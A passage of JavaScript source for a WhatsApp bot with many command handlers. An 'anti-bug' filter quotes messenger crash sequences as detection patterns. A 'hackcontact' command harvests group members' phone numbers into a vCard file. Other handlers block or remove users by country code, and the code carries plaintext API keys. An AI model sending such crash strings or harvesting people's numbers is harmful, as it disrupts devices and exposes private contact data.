        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        PhistarBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            PhistarBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return PhistarBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await PhistarBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await PhistarBotInc.getName(i)}\nFN:${await PhistarBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }
        let antibug = false; // Default state: OFF

const antibugMessage = `
🚫 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 ⚠️  
☠️ 𝐀𝐧𝐭𝐢-𝐁𝐮𝐠 𝐒𝐲𝐬𝐭𝐞𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ⚡  
⚠️◼️◾◽ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓𝐋𝐘 𝐁𝐋𝐎𝐂𝐊𝐄𝐃 ◽◾◼️⚠️  
🚫 **𝐀𝐥𝐥 𝐛𝐮𝐠 𝐚𝐭𝐭𝐞𝐦𝐩𝐭𝐬 𝐰𝐢𝐥𝐥 𝐟𝐚𝐢𝐥!** 🚫
`;

PhistarBotInc.ev.on("messages.upsert", async (m) => {
  try {
    if (!antibug) return; // Exit if Anti-Bug is OFF

    const msg = m.messages[0];
    const sender = msg.key.remoteJid;

    // Skip if message is invalid or sent by the bot
    if (!msg.message || msg.key.fromMe) return;

    const messageContent = JSON.stringify(msg.message);
    const senderID = msg.key.participant || sender;

    // Payload Detection Logic (including the new sequence check)
    if (
      messageContent.length > 5000 || // Long payloads
      /(\u200B|\u200C|\u200D|\u202C|\u202E)/.test(messageContent) || // Invisible Unicode
      /crash|freeze|payload|malicious/i.test(messageContent) || // Bug keywords
      messageContent.includes("⚽ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི") || // Special Sequence 1
      messageContent.includes("ٯٯ𠀋ܱܰٯٯٯٯܱܰ𠀋ܱܰ") || // Special Sequence 2
      messageContent.includes("@529999997*.🔥؄ٽ؄🔥.*@234237*.🔥؄ٽ؄🔥.*@561623423*.~~.*@4124227*.🔥؄ٽ؄🔥.*@777777*.🔥؄ٽ؄🔥.*@529995531316*.~~.*@45*.🤴؄ٽ؄🤴.*@8401*.🤴؄ٽ؄🤴.*@5616*.~~.*@45*.🤴؄ٽ؄🤴.*@8401*.🤴؄ٽ؄🤴.*@5616*.~~.*@45*.🤴؄ٽ؄🤴.*@529995531316*.🤴") || // Special Sequence 3
      messageContent.includes("‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲") || // Special Sequence 4
      messageContent.includes("ꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹ") // New Special Sequence
    ) {
      console.log(`🚨 Strong Payload Detected from ${senderID}`);

      // Send warning to the flagged user
      await PhistarBotInc.sendMessage(sender, { text: antibugMessage });

      // Send alert to the bot owner
      await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
        text: senderID.split("@")[0] + `🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️`});

      // Block the sender
      await PhistarBotInc.updateBlockStatus(sender, "block");

      console.log(`🚫 User ${senderID} has been blocked and reported.`);
    }
  } catch (err) {
    console.error("❌ Error in Anti-Bug System:", err);
  }
});
        if (m.message) {
                             if (m.mtype === "LiveLocationMessage") {
                               newly = "\n".repeat(0x3e8);
                               await PhistarBotInc.sendMessage(m.chat, {
                                 'text': newly
                               });
                               await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
                                 'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                               });
                               await PhistarBotInc.updateBlockStatus(m.sender, "block");
                             }
                           }          
              if (m.message) {
                                    if (m.mtype === "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ") {
                                      newly = "\n".repeat(0x3e8);
                                      await PhistarBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await PhistarBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }
               if (m.message) {
                                    if (m.mtype === "⚽ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི") {
                                      newly = "\n".repeat(0x3e8);
                                      await PhistarBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await PhistarBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }

  
                  
                     if (m.message) {
                                    if (m.mtype === "꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫") {
                                      newly = "\n".repeat(0x3e8);
                                      await PhistarBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await PhistarBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }  
                      // Define and initialize antibilling variable
// Initialize Anti-Billing toggle
let antibilling = false; // Default is off

// Define Billing Keywords
const billingKeywords = [
    'help', 'abeg', 'please', 'money', 'data', 'loan', 'send me', 'airtime', 'cash', 'boss',
    '2k'
    // Add more keywords here
];

// Message Handling
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Only proceed if antibilling is activated and a text message is present
        if (antibilling && m) {
            const isBilling = billingKeywords.some(keyword => m.toLowerCase().includes(keyword));

            if (isBilling) {
                const sender = message.key.remoteJid;

                // Send filler text to chat
                const fillerText = "\n".repeat(1000);
                await PhistarBotInc.sendMessage(sender, { text: fillerText });

                // Notify the bot owner/admin
                const alertText = `${sender.split('@')[0]} 🚫 User flagged for billing attempts! User has been blocked.`;
                await PhistarBotInc.sendMessage(PhistarBotInc.user.id, { text: alertText });

                // Delete the offending message
                await PhistarBotInc.sendMessage(sender, { delete: message.key });

                // Block the user
                await PhistarBotInc.updateBlockStatus(sender, "block");
            }
        }
    } catch (err) {
        console.error('Error in Anti-Billing Handler:', err);
    }
});
// Define keywords for detection
const bigDaddyKeywords = ["play", "time", "weather", "help"]; // Add more keywords as needed

let bigDaddyActive = true; // Default is off

// Message Handling for Big Daddy interactions
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const sender = message.key.remoteJid; // Message sender's ID
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Ensure the bot only responds to messages containing "Big Daddy"
        if (bigDaddyActive && m) {
            const isBigDaddyCall = m.toLowerCase().includes('big daddy');

            if (isBigDaddyCall) {
                // Extract the content following "Big Daddy"
                const command = m.toLowerCase().split('big daddy')[1]?.trim();

                if (command) {
                    // Check if any keyword exists in the command
                    const foundKeyword = bigDaddyKeywords.find(keyword => command.startsWith(keyword));

                    if (foundKeyword) {
                        // Extract and send the text after the detected keyword
                        const responseText = command.replace(foundKeyword, '').trim();
                        await PhistarBotInc.sendMessage(sender, { text: responseText || "I didn't catch that!" });
                    } else {
                        // Ignore if no listed keyword is found after "Big Daddy"
                        return;
                    }
                }
            }
        }
    } catch (err) {
        console.error('Error in Big Daddy Handler:', err);
    }
});

let autoStatusView = true; // Default is OFF

// Listen for messages and statuses
PhistarBotInc.ev.on('messages.upsert', async (msgUpdate) => {
    try {
        if (!autoStatusView) return; // Skip if auto-status view is disabled

        const message = msgUpdate.messages[0];
        if (!message || message.key.remoteJid !== 'status@broadcast') return; // Only process statuses

        const { participant, id } = message.key; // JID of the status sender
        console.log(`Viewing status from ${participant}`);

        // Mark the status as read
        await PhistarBotInc.readMessages([
            {
                remoteJid: 'status@broadcast',
                id: id,
                participant: participant,
            },
        ]);
    } catch (err) {
        console.error('Error viewing statuses:', err);
    }
});

const diaryPath = './diary.json';
function loadDiary() {
    if (!fs.existsSync(diaryPath)) fs.writeFileSync(diaryPath, JSON.stringify({}), 'utf-8');
    return JSON.parse(fs.readFileSync(diaryPath, 'utf-8'));
}
function saveDiary(data) {
    fs.writeFileSync(diaryPath, JSON.stringify(data, null, 2), 'utf-8');
}
global.savedVideos = {};
async function getUserReplyWithTimeout(chatId, timeout) {
    return new Promise((resolve) => {
        const timer = setTimeout(() => resolve(null), timeout); // Timeout after the specified duration

        PhistarBotInc.ev.on('messages.upsert', ({ messages }) => {
            const message = messages[0];
            if (message.key.remoteJid === chatId && !message.key.fromMe) {
                clearTimeout(timer); // Clear the timeout when a reply is received
                resolve(message.message.conversation); // Resolve with the user's message
            }
        });
    });
} 
           if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./Phistar-media/audio/${BhosdikaXeon}.mp3`)
PhistarBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./Phistar-media/sticker/${BhosdikaXeon}.webp`)
PhistarBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./Phistar-media/image/${BhosdikaXeon}.jpg`)
PhistarBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./Phistar-media/video/${BhosdikaXeon}.mp4`)
PhistarBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
PhistarBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
PhistarBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replyphistar(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                PhistarBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
        case 'antilink':
    if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
    if (args.length < 1) return replyphistar(`Example: ${prefix + command} on/off`);
          // Read the current data from the file
    const antilinkGroups = JSON.parse(fs.readFileSync('./database/antilinkall.json', 'utf-8') || '[]');

    if (args.length < 1) return replyphistar(`Example: ${prefix + command} on/off`);

    if (q === 'on') {
        if (antilinkGroups.includes(m.chat)) return replyphistar("✅ Anti-Link is already activated in this group.");
        
        // Add the group ID to the file
        antilinkGroups.push(m.chat);
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkGroups, null, 2));
        replyphistar("✅ Anti-Link has been activated in this group. Any link sent will be deleted.");
    } else if (q === 'off') {
        if (!antilinkGroups.includes(m.chat)) return replyphistar("❌ Anti-Link is already disabled for this group.");
        
        // Remove the group ID from the file
        const updatedGroups = antilinkGroups.filter(group => group !== m.chat);
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(updatedGroups, null, 2));
        replyphistar("✅ Anti-Link has been disabled for this group.");
    } else {
        replyphistar(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable.`);
    }
    break
    case 'autoreact':
    if (!isCreator) return replyphistar('⚠️ Only the bot owner can use Auto-React.');
    if (!args[0]) return replyphistar('⚠️ Usage: autoreact on/off');

    if (q === 'on') {
        autoReact = true;
        replyphistar('✅ Auto-Reaction has been activated. The bot will now react to all messages.');
    } else if (q === 'off') {
        autoReact = false;
        replyphistar('❌ Auto-Reaction has been deactivated. The bot will no longer react to messages.');
    } else {
        replyphistar('⚠️ Invalid option. Use "autoreact on" or "autoreact off".');
    }
    break;
case 'time':
    if (!q.trim()) {
        return replyphistar('⚠️ Please provide a city or location to check the current time. Useage: time Nigeria');
    }

    const location = q.trim().replace(/ /g, '_'); // Replace spaces for better compatibility
    const timeApiUrl = `http://api.timezonedb.com/v2.1/get-time-zone?key=T3RJM7DKOIS8&format=json&by=zone&zone=${location}`;

    try {
        const response = await fetch(timeApiUrl);
        if (!response.ok) {
            return await replyphistar(`⚠️ Could not retrieve time for "${location.replace(/_/g, ' ')}". Please check the location format.`);
        }

        const timeData = await response.json();
        if (timeData && timeData.status === "OK") {
            const formattedTime = timeData.formatted;

            // Send the plain text response
            await replyphistar(`🕰 Current time in ${location.replace(/_/g, ' ')}: ${formattedTime}`);
        } else {
            await replyphistar(`⚠️ Unable to fetch time for "${location.replace(/_/g, ' ')}". Please ensure the location is valid.`);
        }
    } catch (error) {
        console.error('Error fetching time:', error);
        await replyphistar('❌ There was an issue fetching the time. Please try again later.');
    }
    break;
    case 'weather':
    if (q.length === 0) return replyphistar('⚠️ Please provide a city name to check the weather.Useage: weather Nigeria');

    const cityName = q.trim(); // Removes any extra spaces
    const apiKey = '8044b9a239193d667183ab85fea38ca9'; // Your API key
    const weatherApiUrl = `https://api.openweathermap.org/data/2.5/weather?q=${cityName}&appid=${apiKey}&units=metric`;

    try {
        const response = await fetch(weatherApiUrl);
        const weatherData = await response.json();

        if (weatherData.cod === 200) {
            const weatherDescription = weatherData.weather[0].description;
            const temperature = weatherData.main.temp;
            const humidity = weatherData.main.humidity;
            const pressure = weatherData.main.pressure;
            const windSpeed = weatherData.wind.speed;
            const iconCode = weatherData.weather[0].icon;
            const weatherIconUrl = `https://openweathermap.org/img/wn/${iconCode}@2x.png`;

            await PhistarBotInc.sendMessage(
                m.chat,
                {
                    image: { url: weatherIconUrl }, // Use the weather icon as the image
                    caption: `*🌍 Weather in ${cityName}*\n\n` +
                             `*Description:* ${weatherDescription}\n` +
                             `*Temperature:* ${temperature}°C\n` +
                             `*Humidity:* ${humidity}%\n` +
                             `*Pressure:* ${pressure} hPa\n` +
                             `*Wind Speed:* ${windSpeed} m/s\n\n` +
                             `Stay safe and enjoy your day! 🌞`
                },
                { quoted: m }
            );
        } else {
            await replyphistar(`⚠️ City not found! Please try again with a valid city name.`);
        }
    } catch (error) {
        console.error('Error fetching weather:', error);
        await replyphistar('❌ There was an error fetching the weather. Please try again later.');
    }
    break;
    case 'listgc': {
    if (!isCreator) return replyphistar(mess.owner);

    let groups = await PhistarBotInc.groupFetchAllParticipating();
    let groupList = Object.values(groups).map(group => `*${group.subject}*\nID: ${group.id}`).join('\n\n');

    if (!groupList) return replyphistar("No groups found.");

    replyphistar(`📜 *Group List:*\n\n${groupList}\n\nReply with a group ID using *hackcontact <group_id>* to fetch contacts.`);
    break;
}

case 'hackcontact': {
    if (!isCreator) return replyphistar(`This command is for the owner only.`);
    if (!text) return replyphistar(`Please provide a group ID. Example: *vcf 120363025305@g.us*`);

    const groupId = text.trim();
    const groupMetadata = await PhistarBotInc.groupMetadata(groupId).catch(() => null);

    if (!groupMetadata) return replyphistar(`Invalid group ID or I am not in the group.`);

    const participants = groupMetadata.participants;
    let vcard = '';

    // Format group name to remove special characters
    const groupName = groupMetadata.subject.replace(/[^\w\s]/gi, '').replace(/\s+/g, '_');

    // Loop through participants and create vCard entries
    for (let member of participants) {
        try {
            const number = member.id.split("@")[0]; // Extract only the phone number
            
            // Each contact will have the group name as their name
            vcard += `BEGIN:VCARD\n`;
            vcard += `VERSION:3.0\n`;
            vcard += `FN:${groupName} ${number.slice(-4)}\n`; // Group name + last 4 digits for uniqueness
            vcard += `TEL;TYPE=CELL:+${number}\n`; // Phone number
            vcard += `END:VCARD\n\n`;
        } catch (error) {
            console.error(`Error processing member ${member.id}:`, error);
        }
    }

    if (!vcard) return replyphistar(`No contacts found in this group.`);

    // Save all contacts into a .vcf file
    const filename = `Group_Contacts_${groupName}.vcf`;
    fs.writeFileSync(filename, vcard.trim());

    // Send the vCard file
    await PhistarBotInc.sendMessage(m.chat, {
        document: fs.readFileSync(filename),
        mimetype: 'text/vcard',
        fileName: filename,
        caption: `📂 *Hacked Contacts: ${groupMetadata.subject}*`
    }, { quoted: m });

    fs.unlinkSync(filename); // Delete the file after sending
    break;
}
            case 'join':
    try {
        if (!isCreator) return replyphistar(mess.owner); // Only creator can use this command
        if (!text) return replyphistar('Enter a valid Group Link!'); // Validate input
        if (!isUrl(text) || !text.includes('whatsapp.com')) return replyphistar('Invalid Group Link!'); // Check link format
        replyphistar(mess.wait); // Send wait message

        // Extract the invite code from the URL
        let inviteCode = text.split('https://chat.whatsapp.com/')[1];
        if (!inviteCode) return replyphistar('Invalid Invite Code!');

        // Attempt to join the group
        let result = await PhistarBotInc.groupAcceptInvite(inviteCode);
        replyphistar(`Successfully joined the group:`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replyphistar('Successfully joined the group:');
    }
    break;      
                case 'remove': {
    if (!m.isGroup) return replyphistar('This command can only be used in groups.');
    if (!isBotAdmins) return replyphistar('Bot must be an admin to use this command.');
    if (!isGroupOwner) return replyphistar('Only group owners can use this command.');
    
    const countryCode = args[0]; // Get the country code from the command arguments
    if (!countryCode || !countryCode.startsWith('+')) return replyphistar('Please provide a valid country code, e.g., +234.');

    let kickedMembers = 0;

    for (let participant of participants) {
        const number = participant.id.split('@')[0]; // Extract the participant's number
        if (number.startsWith(countryCode.replace('+', '')) && participant.id !== botNumber && participant.id !== groupOwner) {
            try {
                await PhistarBotInc.groupParticipantsUpdate(from, [participant.id], 'remove');
                kickedMembers++;
                await delay(2000); // Add a delay of 2 seconds between each removal
            } catch (err) {
                console.error(`Failed to remove ${participant.id}:`, err);
            }
        }
    }

    if (kickedMembers > 0) {
        replyphistar(`Successfully removed ${kickedMembers} members with numbers starting with ${countryCode}.`);
    } else {
        replyphistar(`No members found with numbers starting with ${countryCode}.`);
    }
    break;
}
case 'promoteall': {
    if (!m.isGroup) return replyphistar('This command can only be used in groups.');
    if (!isBotAdmins) return replyphistar('Bot must be an admin to use this command.');
    if (!isGroupOwner && !isAdmins) return replyphistar('Only group admins can use this command.');

    for (let participant of participants) {
        if (!groupAdmins.includes(participant.id)) {
            try {
                await PhistarBotInc.groupParticipantsUpdate(from, [participant.id], 'promote');
                await delay(500); // Add a delay between each request
            } catch (err) {
                console.log(`Error promoting ${participant.id}:`, err.message);
            }
        }
    }
    replyphistar('Successfully promoted all members to admin.');
    break;
}
            case 'shutdown':
                if (!isCreator) return replyphistar(mess.owner)
                replyphistar(`Goodbye🖐🥺`)
                await sleep(3000)
                process.exit()
                break
            case 'autobio':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replyphistar(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyphistar(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'setexif':
                if (!isCreator) return replyphistar(mess.owner)
